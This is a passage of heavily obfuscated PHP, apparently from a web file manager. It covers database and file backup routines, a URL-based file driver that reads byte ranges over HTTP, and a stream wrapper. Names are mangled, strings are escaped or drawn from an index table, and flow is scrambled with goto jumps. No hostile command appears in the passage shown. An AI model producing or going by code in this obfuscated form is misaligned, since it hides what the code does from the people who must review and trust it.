$céËÛÀ‘ÙÓ[790] => $céËÛÀ‘ÙÓ[791]); if (isset($Dºİîó®¤¬[$C ñÇ·Äºõ])) { $C ñÇ·Äºõ = $Dºİîó®¤¬[$C ñÇ·Äºõ]; } goto DÆñª ì­ç; DÆñª ì­ç: return $C ñÇ·Äºõ; goto DƒÄÅ“ªÎ×; DƒÄÅ“ªÎ×: } private function tmpFilesPath() { $DÇÒöëĞ—¸ =& $_SERVER[œÕÊİğö]; $d†Ì¬Ù„¥ = TEMP_FILES; if ($GLOBALS[$DÇÒöëĞ—¸[6]][$DÇÒöëĞ—¸[98]][$DÇÒöëĞ—¸[792]]) { $d†Ì¬Ù„¥ = $GLOBALS[$DÇÒöëĞ—¸[6]][$DÇÒöëĞ—¸[98]][$DÇÒöëĞ—¸[792]]; if (!mk_dir($d†Ì¬Ù„¥) || !is_writable($d†Ì¬Ù„¥) || !IO::mkfile($d†Ì¬Ù„¥ . $DÇÒöëĞ—¸[793])) { $d†Ì¬Ù„¥ = TEMP_FILES; } } return $d†Ì¬Ù„¥; } } class BackupDbFile { public function __construct() { } public function index() { goto a¨±à¸‰·ö; BÄœÛ‡Ö”´: Backup::set($fßæ¢–›Å¾); return !0; goto c™…ã¸Ãñ; c‰Ç•‰µÛ­: $aºÇ‹÷Ì¸ = $this->tmpFilesPath() . "\x62\x61\x63\x6b\x75\160\137{$bñÃ¹ö‹Ëµ}\57"; $eçóÇ‹–§ = $this->backupPath($f¼£ƒ‚´¥¿); if (!($eçóÇ‹–§ = IO::mkdir($eçóÇ‹–§))) { return !1; } goto dö–Ÿ¤†‡; A×¹ÉŠñ´±: if (!$e¦×ò°£ßË) { return !1; } $fßæ¢–›Å¾ = array($EÔí§÷«à[794] => $e¦×ò°£ßË, $EÔí§÷«à[795] => time()); Backup::set($fßæ¢–›Å¾); goto Bß·ğšõ‘»; a¨±à¸‰·ö: $EÔí§÷«à =& $_SERVER[œÕÊİğö]; $f¼£ƒ‚´¥¿ = Backup::get(); $bñÃ¹ö‹Ëµ = $f¼£ƒ‚´¥¿[$EÔí§÷«à[38]]; goto c‰Ç•‰µÛ­; Bß·ğšõ‘»: $E›á šá¶‰ = new TaskFileTransfer($EÔí§÷«à[796], $EÔí§÷«à[772], count($cÛ‡åŸÔ), LNG($EÔí§÷«à[773]) . $EÔí§÷«à[463] . LNG($EÔí§÷«à[775]) . $EÔí§÷«à[797]); $E›á šá¶‰->task[$EÔí§÷«à[753]] = $e¦×ò°£ßË; foreach ($E¼¡Õ–õÅö[$EÔí§÷«à[84]] as $aÏò¾ÇÙ) { $bÈ¿ÙÏï¥ = IO::move($aÏò¾ÇÙ[$EÔí§÷«à[86]], $eçóÇ‹–§); if (!$bÈ¿ÙÏï¥) { $E›á šá¶‰->end(); $Dàƒ¦¥Šî = IO::getLastError($EÔí§÷«à[798] . $aÏò¾ÇÙ[$EÔí§÷«à[86]] . $EÔí§÷«à[799] . $eçóÇ‹–§ . $EÔí§÷«à[539]); write_log($Dàƒ¦¥Šî, $EÔí§÷«à[772]); return !1; } } goto aáêŠ°ßÇ¾; A×ƒÎ¿Åƒ¢: IO::copy($aÉ™ÉÒ¦¡È, $eçóÇ‹–§); $E›á šá¶‰->end(); $fßæ¢–›Å¾ = array($EÔí§÷«à[802] => $e¦×ò°£ßË, $EÔí§÷«à[803] => time()); goto BÄœÛ‡Ö”´; aáêŠ°ßÇ¾: $Cƒ²Î±×ğã = CONTROLLER_DIR . $EÔí§÷«à[800]; $aÉ™ÉÒ¦¡È = CONTROLLER_DIR . $EÔí§÷«à[801]; IO::copy($Cƒ²Î±×ğã, $eçóÇ‹–§); goto A×ƒÎ¿Åƒ¢; dö–Ÿ¤†‡: $E¼¡Õ–õÅö = IO::listPath($aºÇ‹÷Ì¸); $cÛ‡åŸÔ = isset($E¼¡Õ–õÅö[$EÔí§÷«à[84]]) ? $E¼¡Õ–õÅö[$EÔí§÷«à[84]] : array(); $e¦×ò°£ßË = array_sum(array_column($cÛ‡åŸÔ, $EÔí§÷«à[88])); goto A×¹ÉŠñ´±; c™…ã¸Ãñ: } private function backupPath($a»ÇÌ©±³Ê) { $D™Âß‚† =& $_SERVER[œÕÊİğö]; $eãøßÙÕÍò = $a»ÇÌ©±³Ê[$D™Âß‚†[38]]; $f­“£İÊİ” = Model($D™Âß‚†[760])->get($D™Âß‚†[761]); $BæßØ÷Ìá = substr(md5($D™Âß‚†[762] . $f­“£İÊİ” . $eãøßÙÕÍò), 0, 8); return "\173\151\x6f\72{$a»ÇÌ©±³Ê[$D™Âß‚†[742]]}\x7d\x2f\144\141\x74\141\x62\x61\x73\145\57\x62\x61\143\x6b\165\160\x2f" . $eãøßÙÕÍò . $D™Âß‚†[81] . $BæßØ÷Ìá; } private function tmpFilesPath() { $Fº¸õÇŸ¿ =& $_SERVER[œÕÊİğö]; $a÷¶ËÍ‹¹ = TEMP_FILES; if ($GLOBALS[$Fº¸õÇŸ¿[6]][$Fº¸õÇŸ¿[98]][$Fº¸õÇŸ¿[792]]) { $a÷¶ËÍ‹¹ = $GLOBALS[$Fº¸õÇŸ¿[6]][$Fº¸õÇŸ¿[98]][$Fº¸õÇŸ¿[792]]; if (!mk_dir($a÷¶ËÍ‹¹) || !is_writable($a÷¶ËÍ‹¹) || !IO::mkfile($a÷¶ËÍ‹¹ . $Fº¸õÇŸ¿[793])) { $a÷¶ËÍ‹¹ = TEMP_FILES; } } return $a÷¶ËÍ‹¹; } } class BackupFile { public function __construct() { } public function index() { goto bŞŞî‰¥ÍÃ; Aä•Ì«‘Øä: $this->_fileFilter($dä¯×ñä©‡); return !0; goto c‹ßìÇé„; FŒİ¡“èÜ: $aÈ®õî›‹ß = (int) Model($_SERVER[œÕÊİğö][777])->where($cª¥ÒÄÙÀƒ)->count($_SERVER[œÕÊİğö][470]); $fã–ÏÆã˜§ = (int) Model($_SERVER[œÕÊİğö][777])->where($cª¥ÒÄÙÀƒ)->sum($_SERVER[œÕÊİğö][88]); $f¶²Öé„•× = new TaskFileTransfer($_SERVER[œÕÊİğö][806], $_SERVER[œÕÊİğö][772], $aÈ®õî›‹ß, LNG($_SERVER[œÕÊİğö][773]) . $_SERVER[œÕÊİğö][774] . LNG($_SERVER[œÕÊİğö][807])); goto AğĞĞéĞ‚´; f‹Â¢Ç‡Åñ: $FÃ‚®»´®Ş = array($_SERVER[œÕÊİğö][820] => 1, $_SERVER[œÕÊİğö][499] => time(), $_SERVER[œÕÊİğö][765] => 1, $_SERVER[œÕÊİğö][817] => $F”à¨Šˆ¢º, $_SERVER[œÕÊİğö][809] => $fã–ÏÆã˜§, $_SERVER[œÕÊİğö][808] => $aÈ®õî›‹ß, $_SERVER[œÕÊİğö][821] => time()); if ($e•ñ¸Î¼Üª) { $FÃ‚®»´®Ş[$_SERVER[œÕÊİğö][818]] = $A¬™º³‰÷Ç; $FÃ‚®»´®Ş[$_SERVER[œÕÊİğö][819]] = $DÚ‘›¢œê¹; } Backup::set($FÃ‚®»´®Ş); goto Aä•Ì«‘Øä; bíë™Å×²: $cÀÚ½«§Í = 1000; $DÚ©Û«ª´ = $e•ñ¸Î¼Üª = 0; $dä¯×ñä©‡ = array(); goto Bë°à¯ÌÕ; bŞŞî‰¥ÍÃ: $Døá‚§ë´ = Backup::get(); $F”à¨Šˆ¢º = $Døá‚§ë´[$_SERVER[œÕÊİğö][301]][$_SERVER[œÕÊİğö][203]][$_SERVER[œÕÊİğö][470]]; $cª¥ÒÄÙÀƒ = array($_SERVER[œÕÊİğö][471] => array($_SERVER[œÕÊİğö][804], $F”à¨Šˆ¢º), $_SERVER[œÕÊİğö][805] => array($_SERVER[œÕÊİğö][339], $Døá‚§ë´[$_SERVER[œÕÊİğö][742]])); goto FŒİ¡“èÜ; cä©Ş¹¨çô: $e·‚ò¼Ê× = !0; $bŞÙŸìÚ½£ = $this->storeIds(); $B°£¼Ğ¢Ì = 1; goto bíë™Å×²; Bë°à¯ÌÕ: $DÚ‘›¢œê¹ = $A¬™º³‰÷Ç = 0; do { $fõ¯ÈœÖšï = $_SERVER[œÕÊİğö][811]; $eçëÆùæì³ = Model($_SERVER[œÕÊİğö][777])->where($cª¥ÒÄÙÀƒ)->field($fõ¯ÈœÖšï)->order($_SERVER[œÕÊİğö][812])->selectPage($cÀÚ½«§Í, $B°£¼Ğ¢Ì); $D†ñÃµåâù = !empty($eçëÆùæì³[$_SERVER[œÕÊİğö][377]]) ? $eçëÆùæì³[$_SERVER[œÕÊİğö][377]] : array(); foreach ($D†ñÃµåâù as $E¸óŠÏâÅ) { goto Cí…¼·ù–; B¡Ã—à‘: if (IO::exist($B¶ç´¸»Ú)) { $f¶²Öé„•×->updateFileEnd($E¸óŠÏâÅ[$_SERVER[œÕÊİğö][38]], $E¸óŠÏâÅ[$_SERVER[œÕÊİğö][88]]); } else { $B¶ç´¸»Ú = get_path_father($B¶ç´¸»Ú); IO::mkdir($B¶ç´¸»Ú); if (!IO::copy($F˜îÓÛì‡, $B¶ç´¸»Ú, $_SERVER[œÕÊİğö][815])) { write_log($_SERVER[œÕÊİğö][816] . $F˜îÓÛì‡ . $_SERVER[œÕÊİğö][799] . $B¶ç´¸»Ú . $_SERVER[œÕÊİğö][539], $_SERVER[œÕÊİğö][772]); $e·‚ò¼Ê× = !1; break; } } $F”à¨Šˆ¢º = $E¸óŠÏâÅ[$_SERVER[œÕÊİğö][470]]; $e•ñ¸Î¼Üª += 1; goto d¾§÷´«ô‘; d¾§÷´«ô‘: $DÚ©Û«ª´ += $E¸óŠÏâÅ[$_SERVER[œÕÊİğö][88]]; $A¬™º³‰÷Ç += 1; $DÚ‘›¢œê¹ += $E¸óŠÏâÅ[$_SERVER[œÕÊİğö][88]]; goto DÈæ«ŸÛ”ª; DÈæ«ŸÛ”ª: if ($DÚ©Û«ª´ >= 1024 * 1024 * 100) { $FÃ‚®»´®Ş = array($_SERVER[œÕÊİğö][817] => $F”à¨Šˆ¢º, $_SERVER[œÕÊİğö][818] => $A¬™º³‰÷Ç, $_SERVER[œÕÊİğö][819] => $DÚ‘›¢œê¹); Backup::set($FÃ‚®»´®Ş); $DÚ©Û«ª´ = $e•ñ¸Î¼Üª = 0; } goto dŞŞ×ª„ª»; Cí…¼·ù–: if (!$this->_fileExist($E¸óŠÏâÅ, $dä¯×ñä©‡, $bŞÙŸìÚ½£)) { $aÈ®õî›‹ß -= 1; $fã–ÏÆã˜§ -= (int) $E¸óŠÏâÅ[$_SERVER[œÕÊİğö][88]]; write_log("\146\151\154\145\x20\156\157\x74\x20\145\x78\151\x73\x74\x2e\x66\x69\x6c\145\x49\x44\72{$E¸óŠÏâÅ[$_SERVER[œÕÊİğö][470]]}\x2c\40\x70\141\164\x68\72{$E¸óŠÏâÅ[$_SERVER[œÕÊİğö][86]]}", $_SERVER[œÕÊİğö][813]); continue; } $F˜îÓÛì‡ = $E¸óŠÏâÅ[$_SERVER[œÕÊİğö][86]]; $B¶ç´¸»Ú = "\x7b\151\157\72{$Døá‚§ë´[$_SERVER[œÕÊİğö][742]]}\x7d" . substr($F˜îÓÛì‡, strlen("\173\151\157\72{$E¸óŠÏâÅ[$_SERVER[œÕÊİğö][814]]}\x7d")); goto B¡Ã—à‘; dŞŞ×ª„ª»: } $Dñòİğ‡„ = count($D†ñÃµåâù); $B°£¼Ğ¢Ì++; } while ($Dñòİğ‡„ == $cÀÚ½«§Í); $f¶²Öé„•×->end(); goto f‹Â¢Ç‡Åñ; AğĞĞéĞ‚´: $f¶²Öé„•×->task[$_SERVER[œÕÊİğö][753]] = $fã–ÏÆã˜§; $FÃ‚®»´®Ş = array($_SERVER[œÕÊİğö][808] => $aÈ®õî›‹ß, $_SERVER[œÕÊİğö][809] => $fã–ÏÆã˜§, $_SERVER[œÕÊİğö][810] => time()); Backup::set($FÃ‚®»´®Ş); goto cä©Ş¹¨çô; c‹ßìÇé„: } private function _fileExist($AŞÓ¨Ò²Ï¸, &$CáĞ¾â®, $cÀ³‰ÛÙ„¬) { goto c¨ÎÒæ×„§; DéñéÈÓ¾Ğ: if (!in_array($AŞÓ¨Ò²Ï¸[$e´“ß¾Ğ²”[814]], $cÀ³‰ÛÙ„¬)) { return !1; } if (IO::exist($B†êÄ‚ò¸)) { return !0; } $b¹ÈŒÖÚ†İ = get_path_father($B†êÄ‚ò¸); goto a§î Ä¦Ÿæ; c’ÌµæÂ: $CáĞ¾â® = array_merge($CáĞ¾â®, array_to_keyvalue($dëÍÛÈİ¥’, $e´“ß¾Ğ²”[43], $e´“ß¾Ğ²”[470])); return !1; goto C¶Ã«‚ï³ˆ; c¨ÎÒæ×„§: $e´“ß¾Ğ²” =& $_SERVER[œÕÊİğö]; $B†êÄ‚ò¸ = $AŞÓ¨Ò²Ï¸[$e´“ß¾Ğ²”[86]]; if (in_array($AŞÓ¨Ò²Ï¸[$e´“ß¾Ğ²”[470]], $CáĞ¾â®)) { return !1; } goto DéñéÈÓ¾Ğ; a§î Ä¦Ÿæ: if (IO::exist($b¹ÈŒÖÚ†İ)) { $CáĞ¾â®[] = $AŞÓ¨Ò²Ï¸[$e´“ß¾Ğ²”[470]]; return !1; } $aà·ø—‰ŒÇ = array($e´“ß¾Ğ²”[814] => $AŞÓ¨Ò²Ï¸[$e´“ß¾Ğ²”[814]], $e´“ß¾Ğ²”[86] => array($e´“ß¾Ğ²”[390], "{$b¹ÈŒÖÚ†İ}\x25")); $dëÍÛÈİ¥’ = Model($e´“ß¾Ğ²”[777])->where($aà·ø—‰ŒÇ)->field($e´“ß¾Ğ²”[471])->select(); goto c’ÌµæÂ; C¶Ã«‚ï³ˆ: } private function _fileFilter($C±ª·ÛÊäò) { $EÕà–°Ñ¡ó =& $_SERVER[œÕÊİğö]; if (empty($C±ª·ÛÊäò)) { return; } $C™¹¤è°Œ = array($EÕà–°Ñ¡ó[470] => array($EÕà–°Ñ¡ó[7], array_unique($C±ª·ÛÊäò))); $CËÍ­„ã¯ = Model($EÕà–°Ñ¡ó[822])->where($C™¹¤è°Œ)->field($EÕà–°Ñ¡ó[406])->select(); foreach ($CËÍ­„ã¯ as $bâ‘ßĞù´Õ) { Model($EÕà–°Ñ¡ó[822])->remove($bâ‘ßĞù´Õ[$EÕà–°Ñ¡ó[406]], !1); } } private function storeIds() { $cñŠ³™á¥‘ =& $_SERVER[œÕÊİğö]; $E™†µô×Æ° = Model($cñŠ³™á¥‘[757])->listData(); $D’ãí®­Ó = array(); $FÛí´Š¬¯É = $GLOBALS[$cñŠ³™á¥‘[6]][$cñŠ³™á¥‘[98]][$cñŠ³™á¥‘[823]]; foreach ($E™†µô×Æ° as $a÷Ç‰‹‡‚‘) { $b¾•Æ˜àÆƒ = strtolower($a÷Ç‰‹‡‚‘[$cñŠ³™á¥‘[104]]); if (!isset($FÛí´Š¬¯É[$b¾•Æ˜àÆƒ])) { continue; } $EÔÛ©Éä©å = $cñŠ³™á¥‘[82] . (isset($FÛí´Š¬¯É[$b¾•Æ˜àÆƒ]) ? $FÛí´Š¬¯É[$b¾•Æ˜àÆƒ] : ucfirst($b¾•Æ˜àÆƒ)); if (!class_exists($EÔÛ©Éä©å)) { continue; } $D’ãí®­Ó[] = $a÷Ç‰‹‡‚‘[$cñŠ³™á¥‘[404]]; } return $D’ãí®­Ó; } } goto CÜÎ‹£„ğŸ; e”ä‘À­Ë˜: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($e¨ºÑ¥‘š¨ = false) { } public function exist($AÛ³—˜Õå¯) { $AÀªŠÓ÷·ô = $this->info($AÛ³—˜Õå¯); return $AÀªŠÓ÷·ô[$_SERVER[œÕÊİğö][205]]; } public function isFile($Fè†ˆØ®²Ñ) { $eÒÒæ–Øô¦ = $this->info($Fè†ˆØ®²Ñ); return $eÒÒæ–Øô¦[$_SERVER[œÕÊİğö][205]]; } public function isFolder($D£«ùø©•) { return !1; } public function size($b á°Ş…‡¯) { $fÌ®İğŒƒ¾ = $this->info($b á°Ş…‡¯); return $fÌ®İğŒƒ¾[$_SERVER[œÕÊİğö][88]]; } public function info($FŠ°ÍÇŞ—‘) { return $this->infoParse($FŠ°ÍÇŞ—‘); } public function infoAuth($f•Âá¥´Ø) { return $this->infoParse($f•Âá¥´Ø); } public function infoWithChildren($f×½éä†¥) { return $this->infoParse($f×½éä†¥); } public function infoFull($eŒÃÅÀ¡¶) { return $this->infoParse($eŒÃÅÀ¡¶); } private function infoParse($fÉëíËïñ¸) { $b«õ†ã±Ç¡ =& $_SERVER[œÕÊİğö]; $Bù½…­˜™ = $this->header($fÉëíËïñ¸); if (!$Bù½…­˜™ || !$Bù½…­˜™[$b«õ†ã±Ç¡[740]]) { return !1; } $eáŞ–Øµâ = _get($Bù½…­˜™, $b«õ†ã±Ç¡[345], 0); $CèÒ™‚Ó‚ = array($b«õ†ã±Ç¡[38] => $Bù½…­˜™[$b«õ†ã±Ç¡[38]], $b«õ†ã±Ç¡[86] => $fÉëíËïñ¸, $b«õ†ã±Ç¡[39] => $b«õ†ã±Ç¡[203], $b«õ†ã±Ç¡[88] => intval($eáŞ–Øµâ), $b«õ†ã±Ç¡[178] => get_path_ext($Bù½…­˜™[$b«õ†ã±Ç¡[38]]), $b«õ†ã±Ç¡[1278] => $eáŞ–Øµâ > 0 && $Bù½…­˜™[$b«õ†ã±Ç¡[1398]], $b«õ†ã±Ç¡[1279] => !1); return $CèÒ™‚Ó‚; } private function header($a·Ê«Ì Ÿå) { goto fµÃÆ‚¤òø; fÅ×¿ÙÊŞó: $GLOBALS[$cèß¥íë²[1399]] = !0; self::$_cacheHeader[$a·Ê«Ì Ÿå] = url_header($a·Ê«Ì Ÿå); $GLOBALS[$cèß¥íë²[1399]] = $Aä÷ˆİæõ; goto fåŠ³ÇÎˆë; fåŠ³ÇÎˆë: return self::$_cacheHeader[$a·Ê«Ì Ÿå]; goto dÍó™Î£Û¨; fµÃÆ‚¤òø: $cèß¥íë² =& $_SERVER[œÕÊİğö]; if (isset(self::$_cacheHeader[$a·Ê«Ì Ÿå])) { return self::$_cacheHeader[$a·Ê«Ì Ÿå]; } $Aä÷ˆİæõ = isset($GLOBALS[$cèß¥íë²[1399]]) ? $GLOBALS[$cèß¥íë²[1399]] : !1; goto fÅ×¿ÙÊŞó; dÍó™Î£Û¨: } public function hashSimple($d·¼¢›ºğ, $E‡Éî¦ §Š = false) { goto D”„¶–‚Ğš; A‚ôÙÖ‹’¤: if ($ağŸŸåÚ· <= $aÑ‘Øïé¸Œ * $Dö­ËôÑ£) { return md5($this->fileSubstr($d·¼¢›ºğ, 0, $ağŸŸåÚ·)) . $ağŸŸåÚ·; } $A¦ªãÙ—× = intval($ağŸŸåÚ· / $Dö­ËôÑ£); $díã’ÆóÂ¨ = $FÚùğê¤ôç[43]; goto CÊóÃíÙ«Ï; D”„¶–‚Ğš: $FÚùğê¤ôç =& $_SERVER[œÕÊİğö]; $eöÊšÔ–ÁÍ = $this->info($d·¼¢›ºğ); if (!$eöÊšÔ–ÁÍ || !$eöÊšÔ–ÁÍ[$FÚùğê¤ôç[205]]) { return !1; } goto fÓÍÎâ‘; fÓÍÎâ‘: $ağŸŸåÚ· = $eöÊšÔ–ÁÍ[$FÚùğê¤ôç[88]]; $aÑ‘Øïé¸Œ = 200; $Dö­ËôÑ£ = 50; goto A‚ôÙÖ‹’¤; CÊóÃíÙ«Ï: $A¸±ÃŠĞáñ = timeFloat(); $fÉÊîÜøÖ = 15; for ($eù”° à‡¿ = 0; $eù”° à‡¿ < $Dö­ËôÑ£; $eù”° à‡¿++) { if (timeFloat() - $A¸±ÃŠĞáñ > $fÉÊîÜøÖ) { return !1; } $eÈœÀÌ = $this->fileSubstr($d·¼¢›ºğ, $A¦ªãÙ—× * $eù”° à‡¿, $aÑ‘Øïé¸Œ); if (!$eÈœÀÌ) { return !1; } $díã’ÆóÂ¨ .= $eÈœÀÌ; } goto E£±Ìí‡ò; E£±Ìí‡ò: $díã’ÆóÂ¨ .= $this->fileSubstr($d·¼¢›ºğ, $ağŸŸåÚ· - $aÑ‘Øïé¸Œ, $aÑ‘Øïé¸Œ); return md5($díã’ÆóÂ¨) . $ağŸŸåÚ·; goto f›ÎÁºî; f›ÎÁºî: } public function getContent($bØ¥ŠŠ†È‚) { return $this->fileSubstr($bØ¥ŠŠ†È‚); } public function fileSubstr($aŒ™·‡…¬, $dÈ¢ß¢èôš = 0, $CÑ·œ¸Ì¥Æ = -1) { goto BµÅ”¼·ê; BµÅ”¼·ê: $BÁÁË•‡öï =& $_SERVER[œÕÊİğö]; $C­Ûâ¿ÓÂœ = $this->info($aŒ™·‡…¬); if (!$C­Ûâ¿ÓÂœ || !$C­Ûâ¿ÓÂœ[$BÁÁË•‡öï[205]] && $C­Ûâ¿ÓÂœ[$BÁÁË•‡öï[88]] > 1024 * 1024 * 10) { return !1; } goto e£ğ³Œ”ØÈ; e£ğ³Œ”ØÈ: if ($CÑ·œ¸Ì¥Æ === -1) { $CÑ·œ¸Ì¥Æ = $C­Ûâ¿ÓÂœ[$BÁÁË•‡öï[88]]; } if ($CÑ·œ¸Ì¥Æ == 0) { return $BÁÁË•‡öï[43]; } $f”É¿³á = array($BÁÁË•‡öï[1400] . $dÈ¢ß¢èôš . $BÁÁË•‡öï[774] . ($dÈ¢ß¢èôš + $CÑ·œ¸Ì¥Æ - 1)); goto dÎÃ‰µ¢ç; dÎÃ‰µ¢ç: $CŠ È¡Ï® = url_request($aŒ™·‡…¬, $BÁÁË•‡öï[238], !1, $f”É¿³á, !1, !1, 1); return $CŠ È¡Ï®[$BÁÁË•‡öï[1110]] ? $CŠ È¡Ï®[$BÁÁË•‡öï[1110]] : $BÁÁË•‡öï[43]; goto c•¡¸‰äğÔ; c•¡¸‰äğÔ: } public function download($e«êİëàµµ, $FŒí»íî¼è) { Downloader::start($e«êİëàµµ, $FŒí»íî¼è); return $FŒí»íî¼è; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($B¨ãÆÛÍÆ¤, $eòÍ„•Ùš = '') { goto F¨ˆ–Ã‹àå; cå˜½øÅÇê: if (!isset(self::$_chunkBuffer[$B¨ãÆÛÍÆ¤])) { self::$_chunkBuffer[$B¨ãÆÛÍÆ¤] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; goto b­¿Ò‚‰Ñ‘; E¶ßŒ„öØ: $this->pathOpen = $B¨ãÆÛÍÆ¤; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } goto cå˜½øÅÇê; F¨ˆ–Ã‹àå: $this->info = $this->info($B¨ãÆÛÍÆ¤); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[œÕÊİğö][86]]; goto E¶ßŒ„öØ; b­¿Ò‚‰Ñ‘: } function stream_read($C¿¶•˜¦˜Ê) { $Aóíë¥à¿¬ = $this->fileSubstr($this->pose, $C¿¶•˜¦˜Ê); $this->pose += strlen($Aóíë¥à¿¬); return $Aóíë¥à¿¬; } public function stream_tell() { return $this->pose; } public function stream_seek($B‰áî‰˜, $fÒÕÌòÓ¾‚) { $C—‡ºÁØÅ =& $_SERVER[œÕÊİğö]; if ($fÒÕÌòÓ¾‚ == SEEK_SET) { $this->pose = $B‰áî‰˜; } else { if ($fÒÕÌòÓ¾‚ == SEEK_CUR) { $this->pose += $B‰áî‰˜; } else { if ($fÒÕÌòÓ¾‚ == SEEK_END) { $this->pose = $this->info[$C—‡ºÁØÅ[88]] + intval($B‰áî‰˜); } } } if ($B‰áî‰˜ < 0) { $this->pose = $this->info[$C—‡ºÁØÅ[88]] + $B‰áî‰˜; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[œÕÊİğö][88]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($DÄ™Ú©ô†¤, $Däà¹ˆò¿) { $A¼ø„åİ†¯ =& $_SERVER[œÕÊİğö]; $fç”Ë¿– = $this->info($DÄ™Ú©ô†¤); return array($A¼ø„åİ†¯[1401] => 0, $A¼ø„åİ†¯[1402] => 0, $A¼ø„åİ†¯[22] => 32768 + 511, $A¼ø„åİ†¯[1403] => 0, $A¼ø„åİ†¯[1404] => 0, $A¼ø„åİ†¯[1405] => 0, $A¼ø„åİ†¯[1406] => 0, $A¼ø„åİ†¯[88] => $fç”Ë¿–[$A¼ø„åİ†¯[88]], $A¼ø„åİ†¯[1407] => $fç”Ë¿–[$A¼ø„åİ†¯[1277]], $A¼ø„åİ†¯[1363] => $fç”Ë¿–[$A¼ø„åİ†¯[94]], $A¼ø„åİ†¯[1362] => $fç”Ë¿–[$A¼ø„åİ†¯[204]], $A¼ø„åİ†¯[1408] => 0, $A¼ø„åİ†¯[1409] => 0); } static $fileInfo = array(); public function info($Fƒ·‘öÌ«§) { $EÁø†’˜ëä = $_SERVER[œÕÊİğö][1410]; if (isset(self::$fileInfo[$Fƒ·‘öÌ«§])) { return self::$fileInfo[$Fƒ·‘öÌ«§]; } if (substr($Fƒ·‘öÌ«§, 0, strlen($EÁø†’˜ëä)) != $EÁø†’˜ëä) { return !1; } self::$fileInfo[$Fƒ·‘öÌ«§] = IO::info(substr($Fƒ·‘öÌ«§, strlen($EÁø†’˜ëä))); return self::$fileInfo[$Fƒ·‘öÌ«§]; } public static function read($E„±Íˆô›µ, $D…’ŒÍƒ•›, $FŒ‹…³ÒÎ) { if (!isset(self::$_fopenCache[$E„±Íˆô›µ])) { $e£ˆÖ®¸ = new StreamWrapperIO(); $e£ˆÖ®¸->stream_open($E„±Íˆô›µ); self::$_fopenCache[$E„±Íˆô›µ] = $e£ˆÖ®¸; } $e£ˆÖ®¸ = self::$_fopenCache[$E„±Íˆô›µ]; return $e£ˆÖ®¸->fileSubstr($D…’ŒÍƒ•›, $FŒ‹…³ÒÎ); } public static function _read($A¤¥ˆÑ¾Ÿ, $Cç‡Æù‰®ó, $D¼³Ñ‡Ë„ã) { goto Fš‡óÌŒšº; CÛ¬ÅÚòù³: return $c¡ì‘¦ôí—; goto c‡È“°¤ª³; Fš‡óÌŒšº: $aÈÄÖ‘°Šà =& $_SERVER[œÕÊİğö]; $DßˆõÈ™ºË = fopen($A¤¥ˆÑ¾Ÿ, $aÈÄÖ‘°Šà[1281]); if (!$DßˆõÈ™ºË) { return $aÈÄÖ‘°Šà[43]; } goto f¥†ãŒï™•; f¥†ãŒï™•: $D„óÑéŒë˜ = 8192; fseek($DßˆõÈ™ºË, $Cç‡Æù‰®ó, SEEK_SET); $c¡ì‘¦ôí— = $aÈÄÖ‘°Šà[43]; goto EÜ­Ëª°Ì; EÜ­Ëª°Ì: $e˜“¶¶‹¦­ = 0; while ($e˜“¶¶‹¦­ < $D¼³Ñ‡Ë„ã) { $aî†ò”À‹‡ = min($D„óÑéŒë˜, $D¼³Ñ‡Ë„ã - $e˜“¶¶‹¦­); $c¡ì‘¦ôí— .= fread($DßˆõÈ™ºË, $aî†ò”À‹‡); $e˜“¶¶‹¦­ += $aî†ò”À‹‡; } fclose($DßˆõÈ™ºË); goto CÛ¬ÅÚòù³; c‡È“°¤ª³: } public function fileSubstr($aÄŒØÒ±, $C‹‡‡ÛÀË) { goto e‡Íå¨¼»«; Aˆ¾…•ø´: ksort($AëÂ³¢îÓˆ); $AÄ™ËˆŸÂ† = substr($c‹Ñ“È‰™‹, $aÄŒØÒ± - $DÛ»ôƒƒë—, $C‹‡‡ÛÀË); return $AÄ™ËˆŸÂ†; goto fÙ§È‡‚Ìù; A¯‚ƒŠŠ‡ƒ: foreach ($AëÂ³¢îÓˆ as $A”ŠÉÅªŠî => $D¥…ˆ°ëº•) { $A”ŠÉÅªŠî = intval($A”ŠÉÅªŠî); $aôçÇã¹Ø„ = $A”ŠÉÅªŠî + strlen($D¥…ˆ°ëº•); if ($aÄŒØÒ± >= $aôçÇã¹Ø„) { continue; } if ($aÄŒØÒ± >= $A”ŠÉÅªŠî && $aÄŒØÒ± + $C‹‡‡ÛÀË <= $aôçÇã¹Ø„) { return substr($D¥…ˆ°ëº•, $aÄŒØÒ± - $A”ŠÉÅªŠî, $C‹‡‡ÛÀË); } break; } if (count($AëÂ³¢îÓˆ) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($a“©¼ÃŒ‚[1411], $a“©¼ÃŒ‚[1412] . count($AëÂ³¢îÓˆ) . "\73\x73\x74\141\162\164\75{$aÄŒØÒ±}\54\154\x65\x6e\147\x74\x68\75{$C‹‡‡ÛÀË}\x3b\x70\157\x73\145\72{$A”ŠÉÅªŠî}\x7e{$aôçÇã¹Ø„}"); throw new Exception($a“©¼ÃŒ‚[1413]); } $DÛ»ôƒƒë— = intval($aÄŒØÒ± / $FÍÅÜäÑ­‰) * $FÍÅÜäÑ­‰; goto Dùİ‚öŸíÌ; F¬˜»¤›¯¢: $A”ŠÉÅªŠî = 0; $aôçÇã¹Ø„ = 0; $D¥…ˆ°ëº• = $a“©¼ÃŒ‚[43]; goto A¯‚ƒŠŠ‡ƒ; Dùİ‚öŸíÌ: $cëÒòåÏ = ceil(($aÄŒØÒ± + $C‹‡‡ÛÀË) / $FÍÅÜäÑ­‰) * $FÍÅÜäÑ­‰ - $DÛ»ôƒƒë—; $c‹Ñ“È‰™‹ = IO::fileSubstr($this->path, $DÛ»ôƒƒë—, $cëÒòåÏ); $AëÂ³¢îÓˆ[$DÛ»ôƒƒë— . $a“©¼ÃŒ‚[43]] = $c‹Ñ“È‰™‹; goto Aˆ¾…•ø´; fì…±Ô«É: if ($aÄŒØÒ± + $C‹‡‡ÛÀË > $AÔÈôêŞ—†) { $C‹‡‡ÛÀË = 